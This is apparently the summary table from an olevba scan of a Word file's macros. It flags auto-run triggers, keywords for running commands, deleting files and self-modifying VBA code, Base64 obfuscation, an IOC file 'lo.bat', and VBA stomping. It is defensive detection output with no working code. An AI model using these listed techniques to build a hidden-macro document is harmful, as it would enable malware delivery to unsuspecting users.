+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

